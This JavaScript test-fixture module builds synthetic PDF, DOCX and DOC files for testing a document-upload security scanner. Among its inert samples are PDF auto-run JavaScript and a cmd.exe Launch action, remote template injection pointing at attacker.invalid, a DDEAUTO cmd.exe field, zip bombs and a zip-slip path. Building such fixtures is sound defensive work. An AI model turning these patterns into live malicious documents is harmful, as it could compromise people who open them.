// Arquivos 100% sinteticos para teste (nenhum dado real). Construidos com estrutura REAL minima
// (PDF com xref, CFB v3 com WordDocument/1Table, OPC/ZIP com CRC) para passar a inspecao estrutural.
import { deflateRawSync, deflateSync } from 'node:zlib'

const T = (() => { const t = new Uint32Array(256); for (let n = 0; n < 256; n++) { let c = n; for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1; t[n] = c >>> 0 } return t })()
export const crc32 = (b) => { let c = 0xffffffff; for (let i = 0; i < b.length; i++) c = T[(c ^ b[i]) & 0xff] ^ (c >>> 8); return (c ^ 0xffffffff) >>> 0 }

/* ---------- PDF ---------- */
export function buildPdf({ extraCatalog = '', extraObjects = [], trailerExtra = '' } = {}) {
  const objs = [
    `<</Type/Catalog/Pages 2 0 R${extraCatalog}>>`,
    '<</Type/Pages/Kids[3 0 R]/Count 1>>',
    '<</Type/Page/Parent 2 0 R/MediaBox[0 0 200 200]>>',
    ...extraObjects,
  ]
  let out = '%PDF-1.4\n'
  const offs = []
  objs.forEach((o, i) => { offs.push(out.length); out += `${i + 1} 0 obj\n${o}\nendobj\n` })
  const x = out.length
  out += `xref\n0 ${objs.length + 1}\n0000000000 65535 f \n`
  for (const o of offs) out += `${String(o).padStart(10, '0')} 00000 n \n`
  out += `trailer\n<</Size ${objs.length + 1}/Root 1 0 R${trailerExtra}>>\nstartxref\n${x}\n%%EOF\n`
  return Buffer.from(out, 'latin1')
}
export const pdf = () => buildPdf()
export const pdfJs = () => buildPdf({ extraCatalog: '/OpenAction 4 0 R', extraObjects: ['<</S/JavaScript/JS(app.alert(1))>>'] })
export const pdfObfuscated = () => buildPdf({ extraCatalog: '/Names<</J#61vaScript 4 0 R>>', extraObjects: ['<</S/#4aavaScript>>'] })
export const pdfLaunch = () => buildPdf({ extraObjects: ['<</S/Launch/F(cmd.exe)>>'] })
export const pdfEmbedded = () => buildPdf({ extraObjects: ['<</Type/EmbeddedFile/Length 0>>'] })
export const pdfEncrypted = () => buildPdf({ trailerExtra: '/Encrypt 4 0 R', extraObjects: ['<</Filter/Standard>>'] })
export function pdfObjStmJs() {
  const payload = deflateSync(Buffer.from('4 0 <</S/JavaScript/JS(x)>>'))
  const body = Buffer.concat([
    Buffer.from('<</Type/ObjStm/N 1/First 4/Filter/FlateDecode/Length ' + payload.length + '>>\nstream\n', 'latin1'),
    payload,
    Buffer.from('\nendstream', 'latin1'),
  ])
  return buildPdf({ extraObjects: [body.toString('latin1')] })
}
export const pdfNoXref = () => Buffer.from('%PDF-1.4\n1 0 obj<</Type/Catalog>>endobj\ntrailer<<>>\n%%EOF\n')
export const pdfFake = () => Buffer.from('%PDF-1.4\nlixo qualquer\n')

/* ---------- ZIP / DOCX ---------- */
export function buildZip(entries, { lieUsize = null, method = 8 } = {}) {
  const locals = []
  const cds = []
  let off = 0
  for (const [name, data0] of entries) {
    const data = Buffer.isBuffer(data0) ? data0 : Buffer.from(data0)
    const comp = method === 8 ? deflateRawSync(data) : data
    const nb = Buffer.from(name)
    const lh = Buffer.alloc(30)
    lh.writeUInt32LE(0x04034b50, 0); lh.writeUInt16LE(20, 4); lh.writeUInt16LE(method, 8)
    lh.writeUInt32LE(crc32(data), 14); lh.writeUInt32LE(comp.length, 18); lh.writeUInt32LE(lieUsize ?? data.length, 22); lh.writeUInt16LE(nb.length, 26)
    locals.push(lh, nb, comp)
    const cd = Buffer.alloc(46)
    cd.writeUInt32LE(0x02014b50, 0); cd.writeUInt16LE(20, 4); cd.writeUInt16LE(20, 6); cd.writeUInt16LE(method, 10)
    cd.writeUInt32LE(crc32(data), 16); cd.writeUInt32LE(comp.length, 20); cd.writeUInt32LE(lieUsize ?? data.length, 24); cd.writeUInt16LE(nb.length, 28); cd.writeUInt32LE(off, 42)
    cds.push(cd, nb)
    off += 30 + nb.length + comp.length
  }
  const cdBuf = Buffer.concat(cds)
  const eocd = Buffer.alloc(22)
  eocd.writeUInt32LE(0x06054b50, 0); eocd.writeUInt16LE(entries.length, 8); eocd.writeUInt16LE(entries.length, 10)
  eocd.writeUInt32LE(cdBuf.length, 12); eocd.writeUInt32LE(off, 16)
  return Buffer.concat([...locals, cdBuf, eocd])
}
const MAIN = 'application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml'
const ctXml = (main = MAIN) => `<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="${main}"/></Types>`
const relsXml = '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties" Target="docProps/core.xml"/></Relationships>'
const docXml = (body = 'Curriculo ficticio') => `<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>${body}</w:t></w:r></w:p></w:body></w:document>`
const baseDocx = ({ main, doc, extra = [], docRels = null } = {}) => [
  ['[Content_Types].xml', ctXml(main)],
  ['_rels/.rels', relsXml],
  ['word/document.xml', doc ?? docXml()],
  ...(docRels ? [['word/_rels/document.xml.rels', docRels]] : []),
  ...extra,
]
const relDoc = (rels) => `<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">${rels}</Relationships>`
const RT = 'http://schemas.openxmlformats.org/officeDocument/2006/relationships/'
export const docx = () => buildZip(baseDocx())
export const docm = () => buildZip(baseDocx({ main: 'application/vnd.ms-word.document.macroEnabled.main+xml', extra: [['word/vbaProject.bin', Buffer.alloc(64, 1)]] }))
export const docxWithVbaPart = () => buildZip(baseDocx({ extra: [['word/vbaProject.bin', Buffer.alloc(64, 1)]] }))
export const docxOle = () => buildZip(baseDocx({ extra: [['word/embeddings/oleObject1.bin', Buffer.alloc(64, 2)]] }))
export const docxTemplateInjection = () => buildZip(baseDocx({ docRels: relDoc(`<Relationship Id="rId9" Type="${RT}attachedTemplate" Target="http://attacker.invalid/t.dotm" TargetMode="External"/>`) }))
export const docxHyperlinkOk = () => buildZip(baseDocx({ docRels: relDoc(`<Relationship Id="rId9" Type="${RT}hyperlink" Target="https://example.invalid/" TargetMode="External"/>`) }))
export const docxDde = () => buildZip(baseDocx({ doc: docXml().replace('<w:r>', '<w:r><w:instrText> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe </w:instrText>') }))
export const docxDoctype = () => buildZip(baseDocx({ doc: '<!DOCTYPE x [<!ENTITY a "b">]>' + docXml() }))
export const docxNoContentTypes = () => buildZip(baseDocx().slice(1))
export const docxBadCrc = () => {
  const b = Buffer.from(docx())
  const i = b.indexOf(Buffer.from([0x50, 0x4b, 0x01, 0x02]))
  b.writeUInt32LE((b.readUInt32LE(i + 16) ^ 1) >>> 0, i + 16)
  return b
}
export const zipBombDeclared = () => buildZip([...baseDocx(), ['word/big.xml', Buffer.alloc(35 * 1024 * 1024)]])
export const zipBombLiar = () => buildZip([...baseDocx().slice(0, 2), ['word/document.xml', Buffer.alloc(2 * 1024 * 1024)]], { lieUsize: 100 })
export const zipSlip = () => buildZip(baseDocx({ extra: [['../evil.xml', '<a/>']] }))
export const docxFake = () => Buffer.concat([Buffer.from([0x50, 0x4b, 0x03, 0x04]), Buffer.from('[Content_Types].xml'), Buffer.alloc(32), Buffer.from('word/document.xml'), Buffer.alloc(32)])
export const xlsxLike = () => buildZip([['[Content_Types].xml', ctXml()], ['_rels/.rels', relsXml], ['xl/workbook.xml', '<a/>']])
export const plainZip = () => buildZip([['META-INF/MANIFEST.MF', 'Manifest-Version: 1.0']])

/* ---------- CFB / DOC (v3, setor 512) ---------- */
export function buildDoc({ extraDir = [], encrypted = false, noTable = false, fibMagic = 0xa5ec } = {}) {
  const S = 512, FREE = 0xffffffff, END = 0xfffffffe
  const out = Buffer.alloc(512 + 18 * S, 0) // setores: 0 FAT, 1 DIR, 2-9 WordDocument, 10-17 1Table
  Buffer.from([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]).copy(out, 0)
  out.writeUInt16LE(0x3e, 0x18); out.writeUInt16LE(3, 0x1a); out.writeUInt16LE(0xfffe, 0x1c); out.writeUInt16LE(9, 0x1e); out.writeUInt16LE(6, 0x20)
  out.writeUInt32LE(1, 0x2c); out.writeUInt32LE(1, 0x30); out.writeUInt32LE(4096, 0x38); out.writeUInt32LE(END, 0x3c); out.writeUInt32LE(0, 0x40); out.writeUInt32LE(END, 0x44); out.writeUInt32LE(0, 0x48)
  out.writeUInt32LE(0, 0x4c)
  for (let i = 1; i < 109; i++) out.writeUInt32LE(FREE, 0x4c + i * 4)
  const fat = Buffer.alloc(S, 0xff)
  const f = (i, v) => fat.writeUInt32LE(v, i * 4)
  f(0, 0xfffffffd); f(1, END)
  for (let i = 2; i < 9; i++) f(i, i + 1)
  f(9, END)
  for (let i = 10; i < 17; i++) f(i, i + 1)
  f(17, END)
  fat.copy(out, 512)
  const ents = [['Root Entry', 5, END, 0, 1], ['WordDocument', 2, 2, 4096, null], [noTable ? 'Other' : '1Table', 2, 10, 4096, null], ...extraDir]
  const dir = Buffer.alloc(S, 0)
  ents.forEach(([name, type, start, size, child], i) => {
    const o = i * 128
    const nb = Buffer.from(name, 'utf16le')
    nb.copy(dir, o); dir.writeUInt16LE(nb.length + 2, o + 64); dir[o + 66] = type; dir[o + 67] = 1
    dir.writeUInt32LE(FREE, o + 68); dir.writeUInt32LE(i > 0 && i < ents.length - 1 ? i + 1 : FREE, o + 72); dir.writeUInt32LE(child ?? FREE, o + 76)
    dir.writeUInt32LE(start, o + 116); dir.writeUInt32LE(size, o + 120)
  })
  dir.copy(out, 512 + 1 * S)
  const wd = 512 + 2 * S
  out.writeUInt16LE(fibMagic, wd); out.writeUInt16LE(0x0200 | (encrypted ? 0x0100 : 0), wd + 0x0a)
  return out
}
export const doc = () => buildDoc()
export const docMacros = () => buildDoc({ extraDir: [['Macros', 1, 0xfffffffe, 0, null]] })
export const docVbaProject = () => buildDoc({ extraDir: [['_VBA_PROJECT_CUR', 1, 0xfffffffe, 0, null]] })
export const docObjectPool = () => buildDoc({ extraDir: [['ObjectPool', 1, 0xfffffffe, 0, null]] })
export const docEncrypted = () => buildDoc({ encrypted: true })
export const docNoTable = () => buildDoc({ noTable: true })
export const docBadFib = () => buildDoc({ fibMagic: 0x1234 })
export const docFake = () => Buffer.concat([Buffer.from([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]), Buffer.alloc(512), Buffer.from('WordDocument', 'utf16le'), Buffer.alloc(64)])
export const docTruncated = () => doc().subarray(0, 700)

export const exe = () => Buffer.concat([Buffer.from('MZ'), Buffer.alloc(200, 0x90)])
export const xlsLikeOle = () => Buffer.concat([Buffer.from([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]), Buffer.from('Workbook', 'utf16le')])
export const MIME = {
  pdf: 'application/pdf',
  doc: 'application/msword',
  docx: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
}

/** PDF estruturalmente valido com exatamente n bytes (padding em uma string literal). */
export function pdfOfSize(n) {
  const base = buildPdf({ extraObjects: ['()'] }).length
  let pad = n - base
  let out = buildPdf({ extraObjects: ['(' + 'A'.repeat(pad) + ')'] })
  pad += n - out.length
  out = buildPdf({ extraObjects: ['(' + 'A'.repeat(pad) + ')'] })
  if (out.length !== n) throw new Error('pdfOfSize: ' + out.length + ' != ' + n)
  return out
}
